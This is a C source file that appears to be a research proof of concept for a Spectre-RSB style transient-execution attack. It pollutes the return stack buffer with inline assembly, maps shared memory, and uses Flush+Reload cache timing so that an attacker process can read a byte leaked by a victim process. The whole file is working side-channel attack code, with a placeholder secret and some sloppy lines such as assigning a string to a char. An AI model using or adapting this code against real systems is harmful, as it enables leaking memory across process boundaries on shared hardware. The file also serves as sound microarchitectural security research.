#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#include "libcache/arm_cacheutils.h"

#define SECRET 'S'

// char secret[10] = "SECRET";
char secret;
int idx = 0;

void __attribute__((noinline)) pollute_rsb() {
    #if defined(__i386__) || defined(__x86_64__)
        asm volatile("pop %%rax\n" : : : "rax");
        asm("jmp return_label");
    #elif defined(__aarch64__)
        // asm volatile("ldp x29, x30, [sp], 16\n" : : : "x29");
        asm("b return_label");
    #endif
}
void __attribute__((noinline)) attack() {
	asm("return_label:");
	pollute_rsb();
	// no real execution of this maccess, so we normally should never have cache hits
	// Victim is transiently misdirected here
		cache_encode(secret);
	maccess(0);
}

// Put to sleep for a long period of time 
void __attribute__((noinline)) wrong_return() {
	usleep(100000);
    // asm volatile("clflush (%rsp)");
    return;
}

void __attribute__((noinline)) gadget() {
	// no real execution of this maccess, so we normally should never have cache hits
	// Victim is transiently misdirected here
	cache_encode(SECRET);
}

int main(int argc, char **argv) {
  	int tag = atoi(argv[1]);
	uint8_t value[2];
	int score[2];
	static int results[256];
	int k, j;
  	// Detect cache threshold
	if(!CACHE_MISS)
		CACHE_MISS = 200;
		// CACHE_MISS = detect_flush_reload_threshold();
	printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
	//pid_t is_child = fork() == 0;

  // Attacker always encodes a dot in the cache
	if(tag)
		secret = SECRET;
	else
		secret = ".";
	pagesize = 4096;
	printf("pagesize: %ld\n", pagesize);
	key_t key = ftok("../",  1);
	if (key == -1) {
		printf("error ftok\n");
	}
	int shmid = shmget(key, pagesize * 256, IPC_CREAT | 0666);
	if (shmid < 0) {
		printf("error shmget\n");
		return 0;
	}
  	printf("shmid: %d\n", shmid);
	mem = shmat(shmid, NULL, 0);
	if (mem < 0) {
		printf("error shmat\n");
		return 0;
	}
        printf("%p\n", &attack);
	printf("%p\n", &cache_encode);
	if (tag) {
		while(1) {
			flush_shared_memory();
			mfence();
			wrong_return();
			// cache_encode('S');
			// flush_shared_memory();
			for (int i = 0; i < 256; i++) {
				if (flush_reload(mem + i * pagesize)) {
			 		printf("%c   ", i);
			 		fflush(stdout);
			 	}
			}
			// char s = *mem;
			// printf("%d   ",s);
			sched_yield();
		}
	} else {
		while(1) {
			attack();
			// *mem = 'S';
		}
	}
  	return 0;
}
